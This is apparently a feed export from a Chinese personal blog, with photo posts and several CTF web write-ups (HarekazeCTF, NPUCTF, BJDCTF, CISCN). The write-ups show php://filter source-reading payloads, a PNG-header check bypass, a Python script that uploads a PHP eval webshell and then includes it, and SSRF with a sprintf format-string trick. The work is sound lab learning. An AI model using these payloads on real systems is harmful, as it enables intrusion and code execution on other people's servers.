        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>下面是我拍的照片。QAQ<br><strong>图片在github，加载很慢。</strong></p><h1 id="year-2020"><a href="#year-2020" class="headerlink" title="year 2020"></a>year 2020</h1></blockquote><h2 id="00k-十一月"><a href="#00k-十一月" class="headerlink" title="00k.十一月"></a>00k.十一月</h2><h3 id="0x06-六日"><a href="#0x06-六日" class="headerlink" title="0x06.六日"></a>0x06.六日</h3><p><img src="/2020/11/06/0photos/11/6/0.jpg" alt><br><img src="/2020/11/06/0photos/11/6/1.jpg" alt><br><img src="/2020/11/06/0photos/11/6/2.jpg" alt><br><img src="/2020/11/06/0photos/11/6/3.jpg" alt><br><img src="/2020/11/06/0photos/11/6/4.jpg" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的照片</title>
      <link href="2020/11/06/2020photos/"/>
      <url>2020/11/06/2020photos/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>下面是我拍的照片。QAQ<br><strong>图片在github，加载很慢。</strong></p><h1 id="year-2020"><a href="#year-2020" class="headerlink" title="year 2020"></a>year 2020</h1></blockquote><h2 id="00k-十一月"><a href="#00k-十一月" class="headerlink" title="00k.十一月"></a>00k.十一月</h2><h3 id="0x06-六日"><a href="#0x06-六日" class="headerlink" title="0x06.六日"></a>0x06.六日</h3><p><img src="/2020/11/06/2020photos/11/6/0.jpg" alt><br><img src="/2020/11/06/2020photos/11/6/1.jpg" alt><br><img src="/2020/11/06/2020photos/11/6/2.jpg" alt><br><img src="/2020/11/06/2020photos/11/6/3.jpg" alt><br><img src="/2020/11/06/2020photos/11/6/4.jpg" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019-Avatar-Uploader-1</title>
      <link href="2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/"/>
      <url>2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>画地为牢圈住的是什么。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=1376873330&auto=1&height=66"></iframe><h2 id="00a-关键代码"><a href="#00a-关键代码" class="headerlink" title="00a.关键代码"></a>00a.关键代码</h2><p>这里似乎是比赛的时候给出了源代码：<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/1.png" alt><br>下面的内容就是源代码中比较关键的部分了。<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; check file type$finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);$type &#x3D; finfo_file($finfo, $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);finfo_close($finfo);if (!in_array($type, [&#39;image&#x2F;png&#39;])) &#123;  error(&#39;Uploaded file is not PNG format.&#39;);&#125;&#x2F;&#x2F; check file width&#x2F;height$size &#x3D; getimagesize($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;  error(&#39;Uploaded image is too large.&#39;);&#125;if ($size[2] !&#x3D;&#x3D; IMAGETYPE_PNG) &#123;  &#x2F;&#x2F; I hope this never happens...  error(&#39;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#39; . getenv(&#39;FLAG1&#39;) . &#39;&lt;&#x2F;code&gt;&#39;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>然后需要同时满足用这个<code>finfo_file</code>判断的结果为是一张PNG格式的图片，用<code>getimagesize()</code>判断的结果为不是一张PNG格式的图片。</p><p>那要利用这两个函数的不同之处了，他们的不同之处为：</p><blockquote><p>FILEINFO<code>(finfo)</code>可以识别<code>png图片(十六进制下)的第一行</code>，而<code>getimagesize()不可以</code>，即：我们的文件需要满足下面的代码所述的条件方可getflag<br><pre class="line-numbers language-none"><code class="language-none">&lt;?php$file &#x3D; finfo_open(FILEINFO_MIME_TYPE);var_dump(finfo_file($file, &quot;文件名&quot;));$f &#x3D; getimagesize(&quot;文件名&quot;); var_dump($f[2] &#x3D;&#x3D;&#x3D; IMAGETYPE_PNG);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/2.png" alt><br>下面是<code>文件名</code>文件的生成过程，首先先找个png文件，或者你干脆用qq截图截一张图片，然后用winhex打开，选中选块为第一行的十六进制内容<code>CTRL+C</code>复制到内容<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/3.png" alt></p></blockquote><p>然后新建<code>文件名</code>文件，用winhex再打开，将刚才复制到的内容粘贴到文件头里面去。（这里好像直接把一张png文件的十六进制内容除需要的文件头全部删掉也行，但是似乎稍显麻烦）<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/4.png" alt></p><p>然后刷新一下本地的网页获得结果如下图:<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/5.png" alt></p><h2 id="00b-上传文件，得flag"><a href="#00b-上传文件，得flag" class="headerlink" title="00b.上传文件，得flag"></a>00b.上传文件，得flag</h2><p>直接将我们刚才做好的文件上传到服务器就行了，然后就直接capture the flag了。<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/6.png" alt></p><p><strong>下面是flag</strong><br><pre class="line-numbers language-none"><code class="language-none">flag&#123;253d1171-2735-4d89-bc5c-7b4dccf267bc&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p>纵使相逢应不识，尘满面，鬓如霜</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php图片检查函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezinclude</title>
      <link href="2020/11/06/NPUCTF2020-ezinclude/"/>
      <url>2020/11/06/NPUCTF2020-ezinclude/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>当你想结束的时候，不如想想当初为什么开始。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=402073807&auto=1&height=66"></iframe><h2 id="00a-提示"><a href="#00a-提示" class="headerlink" title="00a.提示"></a>00a.提示</h2><p>先看看源码，发现提示为如下内容<br><pre class="line-numbers language-none"><code class="language-none">username&#x2F;password error&lt;html&gt;&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><img src="/2020/11/06/NPUCTF2020-ezinclude/1.png" alt></p><p>可以看到页面定位到了这里<img src="/2020/11/06/NPUCTF2020-ezinclude/2.png" alt>，访问该页面<code>/flflflflag.php</code>，得到如下结果<img src="/2020/11/06/NPUCTF2020-ezinclude/3.png" alt></p><p>这里可以用<code>php伪协议</code>读取源码，这里我们首先选择使用<code>file协议</code>读取源代码。<code>后来发现用file协议读不到关键的flflflflag.php文件，那就还用php伪协议读取文件</code><br><code>php://filter/convert.base64-encode/resource=flflflflag.php</code></p><h2 id="00b-源码"><a href="#00b-源码" class="headerlink" title="00b.源码"></a>00b.源码</h2><p><code>/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php</code><br><img src="/2020/11/06/NPUCTF2020-ezinclude/4.png" alt>，解码后可得到<code>flflflflag.php</code>文件的内容为:<br><code>flflflflag.php</code><br><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;head&gt;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;           window.location.href&#x3D;&quot;404.html&quot;;&lt;&#x2F;script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="00c-代码审计"><a href="#00c-代码审计" class="headerlink" title="00c.代码审计"></a>00c.代码审计</h2><p>关键的php代码为:<br><pre class="line-numbers language-none"><code class="language-none">&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>这里禁用了<code>data</code>、<code>input</code>、<code>zip</code>、<code>is</code>。</p><p>看wp，可以利用<code>php://filter/string.strip_tags导致php崩溃，同时可上传文件保存在/tmp目录</code>来上传木马。<br><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">漏洞解析</a></p><h2 id="00d-exploit"><a href="#00d-exploit" class="headerlink" title="00d.exploit"></a>00d.exploit</h2><p>payload如下<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>师傅的脚本<br><pre class="line-numbers language-none"><code class="language-none">import requestsfrom io import BytesIOfile_data&#x3D;&#123;&#39;file&#39;: BytesIO(&quot;&lt;?php eval($_POST[sword]);&quot;)&#125;&#39;&#39;&#39;使用PYTHON上传马的固定格式应该就这样吧。&#39;&#39;&#39;url&#x3D;&quot;http:&#x2F;&#x2F;a83bc40c-ca4d-46b2-92b5-4ee0d17edafd.node3.buuoj.cn&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;try:r&#x3D;requests.post(url&#x3D;url,files&#x3D;file_data,allow_redirects&#x3D;False)except:    print(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>这里怎么找到我们刚才上传的马呢？这里可以应该爆破，但是师傅们好像扫描到了更方便的东西。访问<code>dir.php</code>可以echo出我们上传的文件的信息<br><img src="/2020/11/06/NPUCTF2020-ezinclude/6.png" alt></p><h2 id="00e-读取flag"><a href="#00e-读取flag" class="headerlink" title="00e.读取flag"></a>00e.读取flag</h2><p>这里直接包含下木马<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;tmp&#x2F;phpZNhB5P<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="/2020/11/06/NPUCTF2020-ezinclude/7.png" alt></p><p>然后用下面的payload包含木马，并通过hackbar传参<code>sword=phpinfo();</code>,(flag在phpinfo里面。。。)读取flag。<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpZNhB5P#POSTsword&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/11/06/NPUCTF2020-ezinclude/8.png" alt></p><p>capture the flag<br><img src="/2020/11/06/NPUCTF2020-ezinclude/9.png" alt></p><p>flag<br><pre class="line-numbers language-none"><code class="language-none">flag&#123;5e20b2b8-24ac-4940-90e3-f5994ab5b787&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-2nd-文件探测</title>
      <link href="2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/"/>
      <url>2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>我喜欢桂花的香味，但我又讨厌它飘得太远。<br><strong>我看她还行，请认识她的人通知一下她可以追我，希望她不要不识好歹。<code>[歪嘴]</code></strong><br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/bingbing.jpg" alt="bingbing"></p><p>网易云</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=556532480&auto=1&height=66"></iframe></blockquote><h2 id="1-hint-home-php"><a href="#1-hint-home-php" class="headerlink" title="1.hint:home.php"></a>1.hint:home.php</h2><p><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/1.png" alt><br>注意看响应包里面的提示<code>home.php</code>，访问一下得下面的界面<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/2.png" alt></p><p><strong>简单地测试一下</strong></p><p>分为三次输入<code>system.php</code>、<code>8</code>、<code>POST</code><br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/3.png" alt><br>结果返回的内容为<br><pre class="line-numbers language-none"><code class="language-none">python fuck.py -u &quot;8.y1ng.txt&quot; -M POST -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei       Error:  url invalid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>由此可见服务端执行的命令为<br><pre class="line-numbers language-none"><code class="language-none">python fuck.py -u &quot;8.y1ng.txt&quot; -M POST -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="2-php-filter伪协议读取源码"><a href="#2-php-filter伪协议读取源码" class="headerlink" title="2.php://filter伪协议读取源码"></a>2.php://filter伪协议读取源码</h2><p>使用如下的payload可得到源码<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>最后用<code>home</code>(而不是<code>home.php</code>)是因为我们刚才第一步的判断，即他会自动将我们提交的url末尾添加<code>.php</code>后缀。</p><p>读取得到源码<code>index.php</code><br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpsetcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);if(isset($_GET[&#39;file&#39;]))&#123;    if (preg_match(&quot;&#x2F;\^|\~|&amp;|\|&#x2F;&quot;, $_GET[&#39;file&#39;])) &#123;        die(&quot;forbidden&quot;);    &#125;    if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;        die(&quot;not now!&quot;);    &#125;    if(preg_match(&quot;&#x2F;.?a.?d.?m.?i.?n.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;        die(&quot;You! are! not! my! admin!&quot;);    &#125;    if(preg_match(&quot;&#x2F;^home$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;        die(&quot;禁止套娃&quot;);    &#125;    else&#123;        if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;system$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;            $file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;        &#125;        else&#123;            $file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;        &#125;        echo &quot;现在访问的是 &quot;.$file . &quot;&lt;br&gt;&quot;;        require $file;    &#125;&#125; else &#123;    echo &quot;&lt;script&gt;location.href&#x3D;&#39;.&#x2F;home.php?file&#x3D;system&#39;&lt;&#x2F;script&gt;&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><code>system.php</code>文件内容为<br><pre class="line-numbers language-none"><code class="language-none">&lt;?php$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;    #匹配http:&#x2F;&#x2F;127.0.0.1&#x2F;$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;              #匹配flagif (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;    $method &#x3D; $_POST[&#39;q3&#39;];    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;    echo $str1;    if (!preg_match($filter1, $url) )&#123;        die($str2);    &#125;    if (preg_match($filter2, $url)) &#123;        die($str3);    &#125;    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;        die($str4);    &#125;    $detect &#x3D; @file_get_contents($url, false);    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="3-代码审计读admin-php"><a href="#3-代码审计读admin-php" class="headerlink" title="3.代码审计读admin.php"></a>3.代码审计读<code>admin.php</code></h2><p>这里主要利用的是<code>system.php</code>文件来读取我们的<code>admin.php</code>文件<br><pre class="line-numbers language-none"><code class="language-none">#怎么输出问们想要读取的文件主要就是system.php文件的最后一句代码，&#96;print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#96;1.q1没限制，传什么都ok2.q2可注释掉后面的内容，并且要求以&#96;http:&#x2F;&#x2F;127.0.0.1&#96;开头也就是传&#96;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#&#96;3.q3需要绕过&#96;!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)&#96;，而且还得实现&#96;print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#96;所以q3可用&#96;sprintf格式化字符串漏洞&#96;来绕过，使用%绕过，即q3&#x3D;POST%s% -&gt; POST%s%%d,%%会将%吞掉，d就成字符串了(换言之就没用了)print(sprintf(&quot;$url method&amp;content_size:POST%S%%d&quot;, $detect));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><a href="https://www.w3school.com.cn/php/func_string_sprintf.asp">SPRINTF函数的介绍</a></p><p>以以下的payload访问得<code>admin.php</code>的源代码<br><pre class="line-numbers language-none"><code class="language-none">q1&#x3D;1q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#q3&#x3D;POST%s%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>三个值依次在<code>system.php</code>页面的那个框里面输入，记得输入的时候去掉<code>q1=</code>之类的前缀嗷。<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/4.png" alt><br><code>admin.php</code>的源代码为<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fakefunction aesEn($data, $key)&#123;    $method &#x3D; &#39;AES-128-CBC&#39;;    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;function Check()&#123;    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))        return true;    else        return false;&#125;if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123;    #要以本地访问    highlight_file(__FILE__);&#125; else &#123;    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];&#125;$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);if (isset($_GET[&#39;decrypt&#39;])) &#123;    $decr &#x3D; $_GET[&#39;decrypt&#39;];    if (Check())&#123;      #还得绕过check()方法。。。        $data &#x3D; $_SESSION[&#39;secret&#39;];        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;        $cipher &#x3D; aesEn($data, &#39;y1ng&#39;);             if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123;       #给出的密钥要等于你上传的密钥参数            echo WHAT_YOU_WANT;        &#125; else &#123;            die(&#39;爬&#39;);        &#125;    &#125; else&#123;        header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);    &#125;&#125; else &#123;    &#x2F;&#x2F;I heard you can break PHP mt_rand seed    mt_srand(rand(0,9999999));    $length &#x3D; mt_rand(40,80);    $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>需要绕过的点为<br><pre class="line-numbers language-none"><code class="language-none">1.X-Forwarded-For: 127.0.0.12.传入加密内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>第一个好实现，下面是第二个的实现方法。<br><strong>加密算法为</strong><br><pre class="line-numbers language-none"><code class="language-none">function aesEn($data, $key)&#123;    $method &#x3D; &#39;AES-128-CBC&#39;;    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/5.png" alt>这里是你的ip。</p><p>构造payload为<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpfunction aesEn($data, $key)&#123;    $method &#x3D; &#39;AES-128-CBC&#39;;    $iv &#x3D; md5(&quot;172.16.157.96&quot;,true);    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;$cipher &#x3D; aesEn(&#39;&#39;,&#39;y1ng&#39;);     &#x2F;**这里的$data置为空就能绕过随机数session[&#39;secret&#39;]了*&#x2F;echo urlencode($cipher);&#x2F;&#x2F;FP6ZnZ%2F3L96GrtQEepvM1w%3D%3D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>执行脚本得payload<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin.php?decr&#x3D;FP6ZnZ%2F3L96GrtQEepvM1w%3D%3DX-Forwarded-For: 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="4-capture-the-flag"><a href="#4-capture-the-flag" class="headerlink" title="4.capture the flag"></a>4.capture the flag</h2><p>先删除下phpsessid。<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/7.png" alt></p><p>burp里面顺便修改一下xff。<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/6.png" alt></p><p>如下获得flag。<br><img src="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/8.png" alt></p><h2 id="5-flag"><a href="#5-flag" class="headerlink" title="5.flag"></a>5.flag</h2><pre class="line-numbers language-none"><code class="language-none">flag&#123;fe12fd91-0f6c-4f53-b65c-6fbcd3eac770&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
            <tag> php之sprintf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019-华北赛区-Day1-Web5-CyberPunk</title>
      <link href="2020/11/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/"/>
      <url>2020/11/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>晚来天欲雪，能饮一杯无。</p></blockquote><h2 id="1-读取源码"><a href="#1-读取源码" class="headerlink" title="1.读取源码"></a>1.读取源码</h2><p>有提示，下次提示能不能明显一点请问。。。<br><img src="/2020/11/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/1.png" alt><br>访问<code>?file=</code><br>用<code>php伪协议</code>读取一下源码，payload为<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这个读取index.php的内容，下面是效果<br><img src="/2020/11/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/2.png" alt><br>拿到后解码为<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token comment">//index.php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// $file = $_GET["file"];</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span> 